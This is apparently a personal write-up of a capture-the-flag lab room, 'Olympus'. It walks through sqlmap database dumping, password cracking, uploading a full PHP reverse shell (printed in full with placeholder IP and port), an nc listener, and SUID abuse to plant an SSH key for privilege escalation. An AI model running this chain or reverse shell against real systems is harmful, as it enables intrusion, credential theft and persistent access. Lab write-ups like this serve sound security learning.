---
created: 2026-03-15
tags:
  - note
  - journal
  - cyberStuff
title: olympus
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-10-09T12:47:11.751Z
---
1-minute room they say...

First scan:\
![](/images/static/Pasted%20image%2020260315100831.png)

Found an interesting directory when enumerating:\
![](/images/static/Pasted%20image%2020260316065920.png)\
Let's access it:\
![](/images/static/Pasted%20image%2020260316070058.png)\
Interesting login form here; we can use sqlmap on this.\
I am new to sqlmap so I am going to use the `--wizard` option:\
![](/images/static/Pasted%20image%2020260316082518.png)\
Enter the URL when prompted and let it do its job.

We find the current database name is `Olympus`.\
Enumerating `Olympus`, we see there are 6 tables inside it. Dump them all:\
![](/images/static/Pasted%20image%2020260316083909.png)\
Use:

```
sqlmap -r sqlREQ --batch --dump-all -D olympus 
```

This way we get the `users` table which seems interesting:\
![](/images/static/Pasted%20image%2020260316085702.png)\
First flag:

![](/images/static/Pasted%20image%2020260316085804.png)\
And we got some interesting hashes:\
![](/images/static/Pasted%20image%2020260316092550.png)\
I copy-pasted Prometheus's hash into a file and ran John the Ripper on it; it's going to take some time.\
And after some waiting time we get Prometheus's password: `summertime`. Let's log in:\
![](/images/static/Pasted%20image%2020260316093332.png)\
After logging in and going to the Add Post tab inside the Posts menu on the right, we see this form; this looks like an XSS injection opportunity.\
However, this doesn't work:\
![](/images/static/Pasted%20image%2020260316094314.png)\
Let's look at the users: we can observe that all the users have a `@chat.olympus.thm` email address. This may be another subdomain; let's access it.

First of all we need to add the domain to `/etc/hosts` using `sudo nano /etc/hosts` like this:\
![](/images/static/Pasted%20image%2020260317030002.png)\
Now let's access the web page:\
![](/images/static/Pasted%20image%2020260317030057.png)\
Cool, we can log in as Prometheus:\
![](/images/static/Pasted%20image%2020260317030139.png)\
OK interesting, looks like a chat app running inside `home.php`. We can use a PHP reverse shell here.\
Reverse shell that I used:

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";       
$ip = '0000';  // CHANGE THIS
$port =00000; // change this
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>

```

It is important to save this reverse shell script as a `.php` file:\
![](/images/static/Pasted%20image%2020260317032929.png)\
Now that we uploaded a shell we have to access it somehow. For this, let's run another sqlmap command:

```
sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch -D olympus --dump --fresh-querie

```

This command will return a table that looks like this:\
![](/images/static/Pasted%20image%2020260317034333.png)\
Now if we start a listener with:

```bash
rlwrap nc -lnvp 79 
```

and access:\
`http://chat.olympus.thm/uploads/<YOUR_HASH>.php`\
we should receive a reverse shell:\
![](/images/static/Pasted%20image%2020260317034551.png)\
And boom, RCE:\
![](/images/static/Pasted%20image%2020260317034708.png)\
We can upgrade the shell like this:\
![](/images/static/Pasted%20image%2020260317035108.png)\
Let's enumerate SUID binaries with:

```bash
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

```

Before that we can find another flag in Zeus's home directory:\
![](/images/static/Pasted%20image%2020260317035311.png)\
The SUID enumeration returned an interesting binary at `/usr/bin/cputils` that copies files from one location to another. Knowing that, we can place our SSH public key into Zeus's account. First of all, we need to create an SSH key on our machine like this:\
![](/images/static/Pasted%20image%2020260317043327.png)\
Now we need to copy it to our working directory like this:\
![](/images/static/Pasted%20image%2020260317043621.png)\
Then we need to cat our public key like this:\
![](/images/static/Pasted%20image%2020260317043805.png)\
Then run `cputils` like this:\
![](/images/static/Pasted%20image%2020260317043857.png)\
And now connect to Zeus using SSH and the key:\
![](/images/static/Pasted%20image%2020260317043922.png)\
And we are `zeus`:\
![](/images/static/Pasted%20image%2020260317044116.png)\
After enumerating some files we find this:\
![](/images/static/Pasted%20image%2020260317044257.png)\
Weird PHP file, let's `cat` it:\
![](/images/static/Pasted%20image%2020260317044328.png)\
SUID found!\
![](/images/static/Pasted%20image%2020260317044411.png)\
And we found the last flag using:

```bash
grep -irl 'flag{'
```
